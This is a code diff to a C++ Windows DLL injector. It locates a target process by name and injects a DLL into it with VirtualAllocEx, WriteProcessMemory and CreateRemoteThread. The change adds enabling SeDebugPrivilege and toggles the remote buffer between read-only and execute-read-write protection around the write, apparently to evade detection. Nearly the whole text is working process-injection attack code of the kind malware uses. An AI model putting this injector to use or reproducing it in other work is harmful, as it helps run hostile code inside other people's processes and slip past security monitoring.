@@ -48,6 +48,8 @@ DWORD processID(const std::string name)
 int main(int argc, char *argv[])
 {
     HANDLE handleProcess;
+    HANDLE handleToken;
+    LUID luid = { 0 };
     PVOID remoteBuffer;
     wchar_t dllPath[31];
     struct stat buffer;
@@ -86,6 +88,28 @@ int main(int argc, char *argv[])
         mbstowcs_s(NULL, dllPath, strlen(temp) + 1, temp, strlen(temp));
     }
 
+    // Get Token SE_DEBUG_PRIVILEGE
+    //Requires administrator rights ! 
+
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &handleToken)){
+        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+            TOKEN_PRIVILEGES token = { 0 };
+            token.PrivilegeCount = 1;
+            token.Privileges[0].Luid = luid;
+            token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+            AdjustTokenPrivileges(handleToken, FALSE, &token, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+        }
+        else {
+            EXIT_WITH_ERROR("Error LookupPrivilege ! ");
+            CloseHandle(handleToken);
+        }
+    }
+    else {
+        EXIT_WITH_ERROR("Error get SE_DEBUG_PRIVILEGE token ! ");
+        CloseHandle(handleToken);
+    }
+
+    CloseHandle(handleToken);
 
     /* STEP 0 : Search pid of target process */
 
@@ -94,6 +118,7 @@ int main(int argc, char *argv[])
     fprintf(stderr, " **** Injecting DLL to first PID : %i  *****\n",pid);
 
     /* STEP 1 : Get process handle */
+    system("pause");
 
     handleProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 
@@ -102,12 +127,16 @@ int main(int argc, char *argv[])
 
     /* STEP 2 : Allocation virtual memory in the target */
 
-    remoteBuffer = VirtualAllocEx(handleProcess, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
+    remoteBuffer = VirtualAllocEx(handleProcess, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READONLY);
    
     if (!remoteBuffer)
         EXIT_WITH_ERROR("Error remoteBuffer !");
 
    /* STEP 3 : Write DLL path to allocated memory & Get address of LoadLibrary */
+    DWORD oldProtection;
+
+    VirtualProtectEx(handleProcess, remoteBuffer, sizeof dllPath, PAGE_EXECUTE_READWRITE, &oldProtection);
+
 
     WriteProcessMemory(handleProcess, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
 
@@ -125,6 +154,8 @@ int main(int argc, char *argv[])
         EXIT_WITH_ERROR("Error threatStartRoutineAddress");
 
     CreateRemoteThread(handleProcess, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
+
+    VirtualProtectEx(handleProcess, remoteBuffer, sizeof dllPath, PAGE_READONLY, &oldProtection);
 
     system("pause");
 
